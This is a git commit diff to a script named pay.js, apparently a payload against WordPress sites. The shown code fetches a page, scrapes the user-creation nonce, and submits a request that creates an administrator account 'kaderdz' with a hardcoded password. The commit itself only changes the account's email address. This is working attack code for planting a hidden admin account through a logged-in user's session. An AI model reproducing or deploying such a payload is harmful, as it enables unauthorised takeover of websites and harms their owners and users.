ca90d2e3c7e36157a9c071b712aac67235118a74
youngkmd <103062072+youngkmd@users.noreply.github.com>
2022-11-14 13:50:16 -0800

    Update pay.js

--- pay.js
+++ pay.js
@@ -4,7 +4,7 @@ jQuery.get(u, function(e) {
         action: "createuser",
         "_wpnonce_create-user": e.match(/_wpnonce _create-user\"\svalue=\"(.+?)\"/)[1],
         user_Login: "kaderdz",
-        email: "ttest34030@gmail.com",
+        email: "ttest@gmail.com",
         pass1: "hohoHOHO2013@@@",
         pass2: "hohoHOHO2013@@@",
         role: "administrator"
